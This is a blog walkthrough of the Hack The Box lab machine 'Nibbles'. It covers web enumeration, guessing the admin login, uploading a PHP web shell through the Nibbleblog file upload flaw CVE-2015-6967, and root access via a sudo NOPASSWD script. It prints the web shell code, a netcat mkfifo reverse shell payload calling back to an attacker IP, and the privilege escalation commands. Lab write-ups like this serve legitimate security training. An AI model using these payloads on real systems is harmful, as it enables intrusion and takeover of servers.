# Nibbles

Target: Nibbles (Hack The Box) OS: Linux Difficulty: Easy Attack Vectors: File Upload Vulnerability (CVE-2015–6967) -> Web Shell -> Sudo…

***

### 📜 Nibbles: Web Enumeration & File Upload Exploitation

![](https://cdn-images-1.medium.com/max/800/1*TIlF_tClAGBdX9pR-16J5w.png)

image created by Nicholas Mullenski (Gemini)

**Target:** _Nibbles (Hack The Box)_ **OS:** _Linux_ **Difficulty:** _Easy_ **Attack Vectors:** _File Upload Vulnerability (CVE-2015–6967) -> Web Shell -> Sudo Misconfiguration._

### Executive Summary

This assessment targeted “Nibbles,” a Linux-based machine hosting a vulnerable blogging platform. The initial foothold was achieved by identifying a hidden instance of **Nibbleblog 4.0.3**. By leveraging a known Arbitrary File Upload vulnerability (CVE-2015–6967) in the “My Image” plugin, we bypassed security controls to upload a PHP shell, gaining remote code execution as the user **`nibbler`**.

Root compromise was achieved by enumerating local privileges. We discovered a **`sudo`** misconfiguration that allowed the execution of a specific shell script (**`monitor.sh`**) without a password. By recreating this script and injecting a malicious payload, we escalated privileges from a low-level user to full administrative (Root) control.

### 1.0 Initial Foothold

#### 1.1 Reconnaissance & Enumeration

#### 1.1.1 Nmap Scan

The assessment began with a full TCP port scan using Nmap to identify all open services and gather version information on the target 10.10.10.75.

```
┌──(nicholas㉿Nicholas)-[~/HTB/Labs/Nibbles]
└─$ nmap -sC -sV -A -vvv -p- 10.10.10.75
<SNIP>
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   68.83 ms 10.10.14.1
2   70.05 ms 10.10.10.75
<SNIP>
```

#### 1.1.2 Nmap Scan Analysis

The scan identified two open ports on the target 10.10.10.75: SSH (22) and HTTP (80). The SSH service is running **OpenSSH 7.2p2**, which is a standard version for Ubuntu Xenial (16.04). The HTTP service is hosted on **Apache 2.4.18**.

Notably, the Nmap script **`http-title`** reported "Site doesn't have a title." This is a significant indicator that the web root (`/`) may contain a placeholder page or minimal content, requiring us to inspect the HTML source code or perform directory brute-forcing to locate the actual web application.

### 1.2 Key Findings

* **Port 22 (SSH):** OpenSSH 7.2p2 (Ubuntu).
* **Port 80 (HTTP):** Apache httpd 2.4.18.
* **Web Fingerprint:** The lack of a default title suggests the main application is likely hidden in a subdirectory.

### 1.3 Web Application Enumeration

1. **3.1 Analysis** Navigating to **`http://10.10.10.75`** presents a simple "Hello world!" message. This confirms the Nmap finding that the root directory is empty of functionality.

![](https://cdn-images-1.medium.com/max/800/1*flSkwQtkp0PP5pMf-AKXug.png)

Image created by Nicholas Mullenski

**1.3.2 Source Code Review** To identify hidden directories, we must manually inspect the HTML source code for comments or hidden links.

![](https://cdn-images-1.medium.com/max/800/1*Qin7-nHdbmR8AyxYiCmwUQ.png)

Image created by Nicholas Mullenski

**1.3.3 Directory Enumeration** By inspecting the HTML source of the landing page, we discovered a developer comment explicitly mentioning a hidden directory: \`\`. Navigating to **`http://10.10.10.75/nibbleblog/`** revealed a functional blog site powered by **Nibbleblog**, a lightweight XML-based blogging engine.

![](https://cdn-images-1.medium.com/max/800/1*bbS03aBetk8cst6rr9i86Q.png)

Image created by Nicholas Mullenski

#### **1.4 Vulnerability Assessment**

**1.4.1 Technology Identification** Further enumeration of the **`/nibbleblog/`** directory structure led us to the administrative portal at **`http://10.10.10.75/nibbleblog/admin.php`**. We also identified the software version by locating the **`README`** file, which confirmed the installation of **Nibbleblog 4.0.3**.

![](https://cdn-images-1.medium.com/max/800/1*mzhk-1wvTZTV7UBo4rzcGg.png)

Image created by Nicholas Mullenski

**1.4.1 Technology Identification** Further enumeration of the **`/nibbleblog/`** directory structure led us to the **`README`** file, which explicitly disclosed the software version.

* **Software:** Nibbleblog v4.0.3 (Codename: Coffee)
* **Release Date:** 2014–04–01

#### This version is critical as it predates several security patches.

#### 1.5 Authentication & Vulnerability Discovery

#### 1.5.1 Credential Guessing

We located the administrative portal at **`http://10.10.10.75/nibbleblog/admin.php`**. Given the context of the machine name ("Nibbles"), we attempted standard weak credential guessing.

* **Username:** **`admin`**
* **Password:** **`nibbles`**

![](https://cdn-images-1.medium.com/max/800/1*PeqZNNTSqIVSwOnqXs4E9Q.png)

Image created by Nicholas Mullenski

The credentials were valid, granting us administrative access to the dashboard.

![](https://cdn-images-1.medium.com/max/800/1*30p2eQQToBdBokQo5b4FAw.png)

Image created by Nicholas Mullenski

#### 1.5.2 Vulnerability Identification (CVE-2015–6967)

With admin access to Nibbleblog 4.0.3, we identified the **“My Image”** plugin. This specific plugin is vulnerable to **CVE-2015–6967** (Arbitrary File Upload), as it fails to properly sanitize uploaded files, allowing an attacker to upload a PHP script and execute code.

### 2.0 Initial Shell

### 2.1 Payload Delivery

**2.1.1** To leverage the file upload vulnerability, we crafted a minimal PHP web shell to execute system commands.

**Command:**

```

┌──(nicholas㉿Nicholas)-[~/HTB/Labs/Nibbles]
└─$ echo '<?php system($_GET["cmd"]); ?>' > image.php
```

**2.1.2** We navigated to the **My Image** plugin configuration page and uploaded the **`image.php`** file. The application accepted the file without sanitization warnings, storing it in the plugin's directory.

### 2.2 Execution & Verification

**2.2.1** The uploaded file acts as a backdoor. We verified code execution by sending a **`curl`** request to the file path, passing the **`id`** command to confirm the user context.

**Command:**

```
curl http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd=id
```

Output Analysis:

```
┌──(nicholas㉿Nicholas)-[~/HTB/Labs/Nibbles]
└─$ curl http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd=id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

**2.2.2** The server responded with the user ID **`1001(nibbler)`**, confirming that we have achieved Remote Code Execution (RCE).

#### 2.3 Reverse Shell Access

**2.3.1** To establish a stable, interactive session, we embedded a Netcat reverse shell payload directly into the **`image.php`** file and re-uploaded it via the administration panel.

**Payload:**

```
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.24 9443 >/tmp/f"); ?>
```

**Outcome:** Triggering the file via **`curl`** resulted in a callback to our listener on port 9443, granting shell access as the user **`nibbler`**.

#### 2.4 Shell Stabilization

**2.4.1** The initial reverse shell was limited (non-interactive). To facilitate further enumeration and exploit execution, we upgraded to a fully interactive TTY using Python.

**Command:**

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**2.4.2 Outcome:** This provided a stable bash prompt (**`nibbler@Nibbles:/$`**), allowing for standard input handling, command history, and **`sudo`** execution.

![](https://cdn-images-1.medium.com/max/800/1*HrEv7Z_gBIpPsairwA0umQ.png)

Image created by Nicholas Mullenski

### 3.0 Post-Exploitation

#### 3.1 Flag Capture (User)

**3.1.1**With interactive access confirmed, we retrieved the user-level proof of compromise located in the user’s home directory.

**Command:**

```
cat /home/nibbler/user.txt
```

Flag:1b728af8d8871035113389f1a792849b

#### 3.2 Privilege Escalation Enumeration

**3.2.1 Sudo Capabilities** To identify potential privilege escalation vectors, we enumerated the user’s sudo capabilities.

**Command:**

```
sudo -l
```

Output Analysis:

```
<ml/nibbleblog/content/private/plugins/my_image$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

The output reveals a critical misconfiguration: the user `nibbler` can execute the script `/`**`home/nibbler/personal/stuff/monitor.sh`** with root privileges and without a password.

**3.2.2 Path Exploitation** Upon inspection, we determined that the directory structure **`/home/nibbler/personal/stuff/`** was writable (or non-existent). This allows us to create the **`monitor.sh`** file ourselves, inject malicious code, and execute it via **`sudo`** to elevate privileges.

### 3.3 Root Compromise (Exploitation)

To exploit the **`sudo`** misconfiguration, we recreated the directory structure and the target script. Instead of a monitoring tool, we injected a command to spawn a Bash shell.

**Step 1: Script Injection** We created the necessary directory and the **`monitor.sh`** file. We then appended the command **`/bin/bash`** to the script and made it executable.

**Command:**

```
mkdir -p personal/stuff
echo "#!/bin/bash" > personal/stuff/monitor.sh
echo "/bin/bash" >> personal/stuff/monitor.sh
chmod +x personal/stuff/monitor.sh(Note: In the live environment, escaping the ! is necessary, e.g., echo "\#!/bin/bash", to avoid history expansion errors, though the payload succeeded regardless.)
```

\*(Note: In the live environment, escaping the \*_**`!`**_ _is necessary, e.g.,_ _**`echo "\#!/bin/bash"`**\*\*, to avoid history expansion errors, though the payload succeeded regardless.)_

**Step 2: Execution** We executed the script using **`sudo`** to leverage the NOPASSWD configuration.

**Command:**

```
sudo /home/nibbler/personal/stuff/monitor.sh
```

**Outcome:** The command effectively elevated our privileges, transitioning the session from **`nibbler@Nibbles`** to **`root@Nibbles`**.

### 3.4 Flag Capture (Root)

With full administrative access, we retrieved the final objective.

**Command:**

```
nibbler@Nibbles:/home/nibbler$ sudo /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
root@Nibbles:/home/nibbler# cat /root/root.txt
cat /root/root.txt
9b45be389b99157f00488c83882a436e
```

![](https://cdn-images-1.medium.com/max/800/1*KQ2t02QuYAqG9jonaZMtfQ.png)

image created by Nicholas Mullenski (gemini)

### 4.0 Final Thoughts: The Red Team Mandate

The compromise of “Nibbles” illustrates how minor oversights accumulate into a critical failure. The initial entry point was a single vulnerable plugin in a blog platform (Arbitrary File Upload). The path to Root was left open by a “convenience” configuration — a sudo permission for a script that didn’t even exist yet.

By identifying these “small” holes — a nibble here, a misconfiguration there — we dismantled the server’s security posture entirely.

### 4.1 Spiritual Connection

**Song of Solomon 2:15**

> _“Catch for us the foxes, the little foxes that ruin the vineyards, our vineyards that are in bloom.”_

**How it ties into the machine:**

* **The Name:** The machine is named “Nibbles,” implying small bites or small creatures.
* **The Vulnerability:** The security failure wasn’t a massive, complex architecture flaw. It was “little foxes” — a neglected plugin and a lazy **`sudo`** rule.
* **The Application:** Just as little foxes can ruin a whole vineyard by gnawing on the roots, these small, overlooked vulnerabilities (the “nibbles”) destroyed the integrity of the entire server. Security is often lost not in the mountains, but in the details.

### 🚀 Join the Mission

I don’t want to do this alone. I want to build a community of people who are hungry to learn, build, and break things (ethically). I am constantly looking for the next challenge.

* Is there a specific tool you wish existed?
* Is there a hacking concept you want me to learn and explain?
* Do you have a “brick wall” you’re hitting in your own research?

**Jump into the server, drop a message, and tell me what I should build or learn next. Let’s sharpen each other.**

[**Join the Iron-Breach Discord Server!**\
_&#x41;n advanced study group for Offensive Security professionals and students. We specialize in Red Teaming simulation…_&#x64;iscord.gg](https://discord.gg/8buAHtm2fK)

By [Nicholas Mullenski](https://medium.com/@nicholasmullenski) on [January 5, 2026](https://medium.com/p/9b69ed1b579b).

[Canonical link](https://medium.com/@nicholasmullenski/nibbles-web-enumeration-file-upload-exploitation-9b69ed1b579b)

Exported from [Medium](https://medium.com) on September 1, 2026.
